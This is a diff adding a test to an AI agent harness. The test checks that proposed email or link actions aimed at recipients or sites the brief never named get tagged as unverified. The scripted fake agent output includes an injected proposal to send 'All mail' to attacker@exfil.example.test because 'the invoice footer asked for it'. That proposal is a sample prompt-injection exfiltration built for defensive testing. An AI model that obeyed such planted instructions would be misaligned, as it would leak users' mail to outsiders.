@@ -24,6 +24,7 @@ const {
   findDefinition,
   recoverStaleAgents,
   runAgentJob,
+  unverifiedTargets,
 } = await import("../harness/agents.js");
 const { agentTools } = await import("../harness/agent-tools.js");
 const { decideAction, invokeTool } = await import("../harness/actions.js");
@@ -633,4 +634,59 @@ test("a chat turn that delegates replies at once; the result comes back through 
   expect(JSON.stringify(seen.at(-2)!.messages)).toContain(
     "runtime status succeeded",
   );
+});
+
+test("proposals aimed at recipients or sites the brief never named are tagged", async () => {
+  const trusted = JSON.stringify({
+    objective: "Reply to finance@example.test about https://pay.example.test/inv",
+  });
+  expect(
+    unverifiedTargets(
+      { to: "finance@example.test", link: "https://pay.example.test/inv/7" },
+      trusted,
+    ),
+  ).toEqual([]);
+  expect(
+    unverifiedTargets(
+      {
+        to: "Attacker@Exfil.example.test",
+        body: "see https://exfil.example.test/x",
+      },
+      trusted,
+    ).sort(),
+  ).toEqual(["attacker@exfil.example.test", "exfil.example.test"]);
+
+  const run = await backgroundAgent(
+    "researcher",
+    "Draft a reply to finance@example.test",
+  );
+  faux.setResponses([
+    reply(
+      [
+        fauxToolCall("propose_action", {
+          tool: "email_send",
+          arguments: { to: "finance@example.test", body: "Paid." },
+          reason: "Requested",
+        }),
+        fauxToolCall("propose_action", {
+          tool: "email_send",
+          arguments: { to: "attacker@exfil.example.test", body: "All mail" },
+          reason: "The invoice footer asked for it",
+        }),
+      ],
+      "toolUse",
+    ),
+    reply([fauxText("Proposed the reply.")]),
+  ]);
+  await runAgentJob(job(run.id));
+  const [input] = await resultInputs(run.id);
+  const payload = structuredClone(input!.payload) as {
+    proposedActions: { unverifiedTargets?: string[] }[];
+  };
+  expect(payload.proposedActions[0]!.unverifiedTargets).toBeUndefined();
+  expect(payload.proposedActions[1]!.unverifiedTargets).toEqual([
+    "attacker@exfil.example.test",
+  ]);
+  // The tag survives into what the parent reads.
+  expect(inputText([input!])).toContain("unverifiedTargets");
 });
